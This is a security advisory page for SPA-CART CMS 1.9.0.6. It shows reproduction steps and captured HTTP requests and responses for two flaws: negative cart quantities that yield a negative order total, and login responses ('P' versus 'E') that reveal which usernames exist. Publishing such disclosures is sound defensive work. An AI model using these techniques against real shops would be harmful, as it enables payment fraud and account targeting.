---
title: SPA-CART CMS 1.9.0.6 Username Enumeration / Business Logic Flaw
url: https://cxsecurity.com/issue/WLB-2024060046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-19
fetch_date: 2025-10-06T16:54:19.718015
---

# SPA-CART CMS 1.9.0.6 Username Enumeration / Business Logic Flaw

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SPA-CART CMS 1.9.0.6 Username Enumeration / Business Logic Flaw** **2024.06.18**  Credit:  **[Andrey Stoykov](https://cxsecurity.com/author/Andrey%2BStoykov/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Business Logic Flaw and Username Enumeration in
spa-cartcmsv1.9.0.6
# Date: 6/2024
# Exploit Author: Andrey Stoykov
# Version: 1.9.0.6
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2024/04/friday-fun-pentest-series-5-spa.html
<http://msecureltd.blogspot.com/>
Description
- It was found that the application suffers from business logic flaw
- Additionally the application is vulnerable to username enumeration on the
login page
Logic Flaw
Steps to Reproduce:
1. Checkout page and intercept HTTP POST request
2. Add minus quantity such as -10
3. The final price would come up as negative value
// HTTP POST request modifying the quantity to negative value
POST /cart/add HTTP/2
Host: demo.spa-cart.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/123.0.6312.122
[...]
productid=225&amount=-10
// HTTP response
HTTP/2 200 OK
Server: nginx
[...]
[...]
<img src="https://demo.spa-cart.com/var/photo/product/234x200/225/695/1.jpg"
alt="" /><b>Five And Two Jewelry Piper Gold-Plated Earrings</b> added to
cart
<br /><br />
<strong class="added\_price">Price: <span><span
class="currency">$</span>59.00</span></strong>
<div class="added\_options">
<b>Selected options:</b>
Qty: 1<br />
Color: silver gold<br />
</div>
[...]
// HTTP GET request to checkout
GET /checkout HTTP/2
Host: demo.spa-cart.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/123.0.6312.122
[...]
// HTTP response showing negative amount owned
HTTP/2 200 OK
Server: nginx
[...]
[...]
\t<td>silver gold<\/td>\r\n<\/tr>\r\n<\/table>\r\n <\/td>\r\n <td
class=\"line\" nowrap align=\"right\">\r\n<span
class=\"currency\">$<\/span>59.00 x -10 =
<span class=\"currency\">$<\/span>-590.00 <\/td>
[...]
Username Enumeration:
Steps to Reproduce:
1. Register account
2. Enter valid account with wrong password
3. Trap HTTP request
4. Check that response for valid username has "P" message
5. Enter invalid account with wrong password
6. Check that response for invalid username has "E" message
// HTTP POST request with valid username and wrong password
POST /login HTTP/2
Host: demo.spa-cart.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
[...]
email=test%40test.test&password=test123
// HTTP response showing "P" error message
HTTP/2 200 OK
Server: nginx
[...]
P
// HTTP POST request with invalid username and wrong password
POST /login HTTP/2
Host: demo.spa-cart.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
[...]
email=test%40test.t3st&password=test123
// HTTP response showing "E" error message
HTTP/2 200 OK
Server: nginx
[...]
E

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top